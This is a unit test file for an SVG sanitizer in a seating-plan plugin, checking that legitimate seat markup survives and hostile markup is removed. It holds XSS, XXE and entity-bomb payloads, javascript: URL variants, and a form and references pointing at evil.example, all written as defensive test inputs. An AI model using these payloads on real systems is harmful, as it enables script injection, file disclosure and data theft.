"""
Unit tests for the SVG allow-list sanitizer (pretix_simpleseatingplan.svg_sanitize).

Two halves: hostile input must come out inert, and the markup a real
seating plan is made of (our own generated plans and typical editor
exports) must survive untouched, because seatpicker.js / auditplan.js /
ticket_image.py rely on ids, data-seat-* attributes, fills and geometry.
"""
from django.test import SimpleTestCase
from lxml import etree

from pretix_simpleseatingplan.svg_sanitize import (
    ALLOWED_ELEMENTS, SVG_NS, SvgSanitizeError, clean_plan_svg, sanitize_svg,
)

WRAP = '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200" viewBox="0 0 300 200">%s</svg>'


def parse(svg):
    return etree.fromstring(svg.encode('utf-8'))


def find_all(root, local):
    return root.xpath('.//*[local-name()=$n]', n=local)


class LegitimatePlansSurviveTests(SimpleTestCase):
    def test_our_own_generated_seat_markup_is_preserved(self):
        src = WRAP % (
            '<rect x="0" y="0" width="100%" height="100%" fill="#f8f9fa"/>'
            '<text class="row-label" x="10.5" y="20">A</text>'
            '<g id="seat-a1" data-seat-id="uuid-1" data-seat-label="A-1" data-seat-category="Cat I">'
            '<circle class="seat-dot" cx="50.00" cy="50.00" r="12" fill="#22c55e" stroke="#0f172a" stroke-width="1"/>'
            '<text x="50.00" y="53.00" text-anchor="middle" font-size="10" fill="#0f172a">1</text>'
            '</g>'
        )
        out = parse(sanitize_svg(src))
        self.assertEqual(out.get('viewBox'), '0 0 300 200')
        self.assertEqual(out.get('width'), '300')
        g = find_all(out, 'g')[0]
        self.assertEqual(g.get('id'), 'seat-a1')
        self.assertEqual(g.get('data-seat-id'), 'uuid-1')
        self.assertEqual(g.get('data-seat-label'), 'A-1')
        self.assertEqual(g.get('data-seat-category'), 'Cat I')
        circle = find_all(out, 'circle')[0]
        self.assertEqual(
            dict(circle.attrib),
            {'class': 'seat-dot', 'cx': '50.00', 'cy': '50.00', 'r': '12',
             'fill': '#22c55e', 'stroke': '#0f172a', 'stroke-width': '1'},
        )
        self.assertEqual([t.text for t in find_all(out, 'text')], ['A', '1'])
        self.assertEqual(find_all(out, 'rect')[0].get('width'), '100%')

    def test_output_is_in_the_svg_namespace_whatever_the_input_prefixing(self):
        src = ('<svg:svg xmlns:svg="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
               '<svg:circle id="seat-x" cx="1" cy="1" r="1"/></svg:svg>')
        out = sanitize_svg(src)
        self.assertNotIn('svg:', out)
        self.assertEqual(parse(out).xpath('//*[@id="seat-x"]')[0].tag, '{%s}circle' % SVG_NS)

    def test_namespace_less_svg_is_accepted(self):
        out = parse(sanitize_svg('<svg viewBox="0 0 10 10"><circle id="seat-a" cx="1" cy="1" r="1"/></svg>'))
        self.assertEqual(len(find_all(out, 'circle')), 1)

    def test_fragment_references_and_gradients_survive(self):
        src = WRAP % (
            '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient>'
            '<circle id="tpl" r="5"/></defs>'
            '<use href="#tpl" x="5"/><use xlink:href="#tpl" xmlns:xlink="http://www.w3.org/1999/xlink"/>'
            '<rect fill="url(#g)" width="5" height="5"/>'
        )
        out = sanitize_svg(src)
        self.assertEqual(out.count('href="#tpl"'), 2)
        self.assertIn('fill="url(#g)"', out)
        self.assertIn('linearGradient', out)

    def test_embedded_raster_image_survives(self):
        img = 'data:image/png;base64,iVBORw0KGgo='
        out = sanitize_svg(WRAP % ('<image href="%s" width="5" height="5"/>' % img))
        self.assertIn(img, out)

    def test_harmless_inline_style_is_kept(self):
        out = parse(sanitize_svg(WRAP % '<path id="seat-p" d="M0 0L5 5" style="fill:#ff0000;stroke:#000"/>'))
        style = find_all(out, 'path')[0].get('style')
        self.assertIn('fill:#ff0000', style)
        self.assertIn('stroke:#000', style)

    def test_text_content_and_entities_are_kept_as_text(self):
        out = sanitize_svg(WRAP % '<text x="1" y="1">Tom &amp; Jerry &lt;VIP&gt;</text>')
        root = parse(out)
        self.assertEqual(find_all(root, 'text')[0].text, 'Tom & Jerry <VIP>')
        self.assertNotIn('<VIP>', out)  # still escaped on the way out

    def test_processing_instructions_and_comments_are_dropped(self):
        out = sanitize_svg('<?xml version="1.0"?><!-- hi --><svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>')
        self.assertNotIn('<!--', out)
        self.assertNotIn('<?', out)


class HostileMarkupIsNeutralisedTests(SimpleTestCase):
    def assertNoActiveContent(self, out):
        root = parse(out)
        for el in root.iter():
            local = etree.QName(el).localname
            self.assertIn(local, ALLOWED_ELEMENTS, 'unexpected element <%s> in %s' % (local, out))
            for name, value in el.attrib.items():
                self.assertFalse(name.lower().startswith('on'), 'event handler kept: %s' % name)
                self.assertNotIn('javascript:', value.lower())
                self.assertNotIn('http://', value.lower().replace(SVG_NS, ''))
                self.assertNotIn('https://', value.lower())

    def test_script_element_is_removed_with_its_content(self):
        out = sanitize_svg(WRAP % '<script>alert(document.cookie)</script><circle r="1"/>')
        self.assertNotIn('script', out.lower())
        self.assertNotIn('alert', out)
        self.assertEqual(len(find_all(parse(out), 'circle')), 1)

    def test_event_handler_attributes_are_removed(self):
        src = ('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
               '<circle r="1" onclick="alert(2)" onmouseover="alert(3)" ONERROR="alert(4)"/></svg>')
        out = sanitize_svg(src)
        self.assertNotIn('alert', out)
        self.assertNotIn('onload', out.lower())
        self.assertNoActiveContent(out)

    def test_javascript_urls_are_removed_in_every_spelling(self):
        for payload in ('javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\nscript:alert(1)',
                        'java\tscript:alert(1)', ' javascript:alert(1)', 'vbscript:msgbox(1)'):
            for markup in (
                '<a href="%s"><circle r="1"/></a>',
                '<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="%s"><circle r="1"/></a>',
                '<circle r="1" fill="%s"/>',
                '<use href="%s"/>',
            ):
                out = sanitize_svg(WRAP % (markup % payload))
                self.assertNotIn('script', out.lower(), (payload, markup, out))
                self.assertNotIn('alert', out, (payload, markup, out))

    def test_anchors_are_unwrapped_but_their_shapes_are_kept(self):
        out = parse(sanitize_svg(WRAP % '<a href="https://evil.example/"><circle id="seat-a" r="1"/></a>'))
        self.assertEqual(find_all(out, 'a'), [])
        self.assertEqual(len(find_all(out, 'circle')), 1)

    def test_foreignobject_html_and_forms_are_removed(self):
        out = sanitize_svg(WRAP % (
            '<foreignObject width="300" height="200"><div xmlns="http://www.w3.org/1999/xhtml">'
            '<form action="https://evil.example/"><input name="cc"></form></div></foreignObject>'
        ))
        for word in ('foreignObject', 'form', 'input', 'evil'):
            self.assertNotIn(word, out)

    def test_style_elements_animations_and_filters_are_removed(self):
        out = sanitize_svg(WRAP % (
            '<style>@import url(https://evil.example/x.css); circle{fill:red}</style>'
            '<circle r="1"><animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onclick" to="alert(1)"/></circle>'
            '<filter id="f"><feImage href="https://evil.example/x.png"/></filter>'
        ))
        for word in ('style', 'animate', 'set ', 'filter', 'feImage', 'evil', 'alert'):
            self.assertNotIn(word, out)
        self.assertEqual(len(find_all(parse(out), 'circle')), 1)

    def test_external_references_are_removed(self):
        out = sanitize_svg(WRAP % (
            '<image href="https://evil.example/track.png" width="1" height="1"/>'
            '<image href="file:///etc/passwd" width="1" height="1"/>'
            '<use href="https://evil.example/x.svg#a"/>'
            '<rect fill="url(https://evil.example/x.svg#a)" width="1" height="1"/>'
            '<rect style="fill:url(//evil.example/a.svg#b);stroke:red" width="1" height="1"/>'
            '<image href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" width="1" height="1"/>'
        ))
        self.assertNotIn('evil', out)
        self.assertNotIn('passwd', out)
        self.assertNotIn('svg+xml', out)
        # the harmless part of the mixed style declaration is kept
        self.assertIn('stroke:red', out)

    def test_foreign_namespace_elements_are_removed(self):
        out = sanitize_svg(
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:h="http://www.w3.org/1999/xhtml">'
            '<h:script>alert(1)</h:script><h:iframe src="https://evil.example"/><circle r="1"/></svg>'
        )
        self.assertNotIn('alert', out)
        self.assertNotIn('iframe', out)

    def test_entity_encoded_markup_in_text_stays_inert_text(self):
        """The old importer html.unescape()d the upload, turning this into a
        real <script> element. It must remain plain text."""
        out = sanitize_svg(WRAP % '<text x="1" y="1">&lt;script&gt;alert(1)&lt;/script&gt;</text>')
        root = parse(out)
        self.assertEqual(find_all(root, 'script'), [])
        self.assertEqual(find_all(root, 'text')[0].text, '<script>alert(1)</script>')
        self.assertNotIn('<script>', out)

    def test_attribute_breakout_attempts_stay_inside_the_attribute(self):
        src = WRAP % '<circle r="1" fill="&quot; onload=&quot;alert(1)" data-seat-label="x&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/>'
        out = sanitize_svg(src)
        root = parse(out)  # must still be well formed
        self.assertEqual(find_all(root, 'script'), [])
        self.assertNoActiveContent(out)


class DocumentLevelAttacksTests(SimpleTestCase):
    def test_xxe_entity_declarations_are_rejected(self):
        src = ('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
               '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')
        with self.assertRaises(SvgSanitizeError):
            sanitize_svg(src)

    def test_entity_expansion_bomb_is_rejected(self):
        src = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
               '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
               '<svg xmlns="http://www.w3.org/2000/svg"><text>&lol2;</text></svg>')
        with self.assertRaises(SvgSanitizeError):
            sanitize_svg(src)

    def test_plain_doctype_without_entities_is_tolerated(self):
        src = ('<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
               '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>')
        self.assertEqual(len(find_all(parse(sanitize_svg(src)), 'circle')), 1)

    def test_non_svg_documents_are_rejected(self):
        for src in ('<html><body>hi</body></html>', '{"json": true}', '', 'not xml at all', '<div><svg/></div>'):
            with self.assertRaises(SvgSanitizeError, msg=src):
                sanitize_svg(src)

    def test_oversized_input_is_rejected(self):
        with self.assertRaises(SvgSanitizeError):
            sanitize_svg('<svg xmlns="http://www.w3.org/2000/svg">' + '<g/>' * 2_000_000 + '</svg>')

    def test_too_many_elements_are_rejected(self):
        from pretix_simpleseatingplan import svg_sanitize
        old = svg_sanitize.MAX_ELEMENTS
        svg_sanitize.MAX_ELEMENTS = 50
        try:
            with self.assertRaises(SvgSanitizeError):
                sanitize_svg(WRAP % ('<g/>' * 100))
        finally:
            svg_sanitize.MAX_ELEMENTS = old

    def test_deeply_nested_input_does_not_crash(self):
        src = WRAP % (('<g>' * 5000) + ('</g>' * 5000))
        try:
            sanitize_svg(src)
        except SvgSanitizeError:
            pass  # rejecting is fine; an unhandled RecursionError is not

    def test_sanitizing_is_idempotent(self):
        src = WRAP % ('<g id="seat-a1" data-seat-label="A-1"><circle cx="1" cy="1" r="1" fill="#fff"/></g>'
                      '<script>x</script><a href="javascript:1"><rect width="1" height="1"/></a>')
        once = sanitize_svg(src)
        self.assertEqual(sanitize_svg(once), once)


class StoredPlanCleaningTests(SimpleTestCase):
    """clean_plan_svg() is what every output path uses on the *stored* value,
    which may pre-date sanitization."""

    def test_legacy_hostile_svg_is_cleaned_on_output(self):
        out = clean_plan_svg(WRAP % '<script>alert(1)</script><circle id="seat-a" r="1" onclick="alert(2)"/>')
        self.assertNotIn('alert', out)
        self.assertIn('seat-a', out)

    def test_unusable_stored_value_yields_empty_string_not_an_exception(self):
        self.assertEqual(clean_plan_svg('<html>nope</html>'), '')
        self.assertEqual(clean_plan_svg(''), '')
        self.assertEqual(clean_plan_svg(None), '')
